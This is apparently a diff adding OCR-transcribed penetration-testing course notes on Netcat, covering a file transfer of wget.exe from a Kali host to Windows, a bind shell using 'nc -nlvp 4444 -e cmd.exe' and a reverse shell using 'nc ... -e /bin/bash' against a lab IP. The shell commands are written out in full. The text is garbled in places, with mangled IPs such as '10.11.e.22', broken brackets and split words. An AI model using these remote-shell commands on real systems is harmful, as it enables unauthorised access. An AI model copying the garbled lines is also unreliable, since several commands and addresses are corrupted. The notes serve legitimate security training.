@@ -44,10 +44,55 @@ This chat is from the windows machine
  
  C:\Users\offsec> nc - nlvp 4444 > incoming.exe
 listeni ng on [any] 4444 ...
+
+
  
  kali@kali:-$ locate wget. exe
 /usr/share/windows-resources/binaries/wget.exe
 kali@kali:-$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
 (UNKNOWN) (10.11.0.22) 4444 (?} open
+
+C:\Users\offsec> nc -nlvp 4444 > incoming.exe
+listening on [any) 4444
+connect to [10.11.0.22] from <UNKNOWN) [10.11.0.4] 43459
+"C
+C:\Users\offsec>
+
+C: \Users\offsec> incoming.exe -h
+GNU Wget 1.9.1, a non-interactive network retriever.
+Usage: incoming (OPTION) ... (URL] 
+
+---
+
+Remote Administration with Netcat 
+
+Netcat Bind Shell Scenario 
+
+C:\Users\offsec> nc -nlvp 4444 -e cmd.exe
+listening on [any] 4444 .••
+
+
+kali@kali:~$ nc -nv 10.11.8.22 4444
+(UNKNOWN) [10.11.0.22) 4444 (?) open
+Mic rosoft Windows [Version 10.0.17134.590]
+(c) 2018 Microsoft Corporation. All rights reserved. 
+
+---
+
+Reverse Shell Scenario 
+
+C:\Users\offsec> nc - nlvp 4444
+listening on [any] 4444 ... 
+
+kali@kali:-$ nc -nv 10.11.e.22 4444 -e /bin/bash
+(UNKNOWN) [10.11.0.22] 4444 (?) open 
+
+C:\Users\offsec>nc -ntvp 4444
+listening on [any] 4444 ..•
+connect to (10.11.0.22] from <UNKNOWN) (10.11.0.4) 43482
+
+
+
+
 
 
